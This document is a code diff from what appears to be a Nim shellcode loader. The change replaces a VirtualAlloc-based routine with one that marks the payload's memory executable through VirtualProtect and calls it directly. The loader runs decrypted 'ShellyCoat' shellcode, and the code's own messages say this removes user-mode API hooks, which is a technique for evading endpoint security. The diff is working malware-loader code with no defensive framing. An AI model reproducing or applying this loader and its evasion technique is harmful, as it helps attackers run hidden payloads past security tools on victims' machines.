@@ -154,12 +154,21 @@ when isMainModule:
     encodedPay = cryptedInput
     
     # Run shellcode using VirtualAlloc()
-    proc rscva(payload: openArray[byte]): void =
-        var allocated = VirtualAlloc(nil, len(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    # proc rscva(payload: openArray[byte]): void =
+    #     var allocated = VirtualAlloc(nil, len(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    #     if verbose:
+    #         doAssert not allocated.isNil(), "Error executing VirtualAlloc()"
+    #     copyMem(allocated, payload[0].unsafeAddr, len(payload))
+    #     let f = cast[proc(){.nimcall.}](allocated)
+    #     f()
+
+    # Run shellcode user VirtualProtect()
+    proc rscvp(payload: openArray[byte]): void =
+        var oldProtect : DWORD
+        var ret = VirtualProtect(payload.unsafeAddr, len(payload), PAGE_EXECUTE_READWRITE, oldProtect.addr)
         if verbose:
-            doAssert not allocated.isNil(), "Error executing VirtualAlloc()"
-        copyMem(allocated, payload[0].unsafeAddr, len(payload))
-        let f = cast[proc(){.nimcall.}](allocated)
+            doAssert ret != 0, "Error executing VirtualProtect()"
+        let f = cast[proc(){.nimcall.}](payload.unsafeAddr)
         f()
 
     if cryptedCoat != "":
@@ -176,7 +185,8 @@ when isMainModule:
         dctx.clear()
 
         # Remove user-mode API hooks by running ShellyCoat shellcode
-        rscva(decodedCoat)
+        # rscva(decodedCoat)
+        rscvp(decodedCoat)
         if verbose:
             echo "[*] User-mode API hooks removed: true"
             
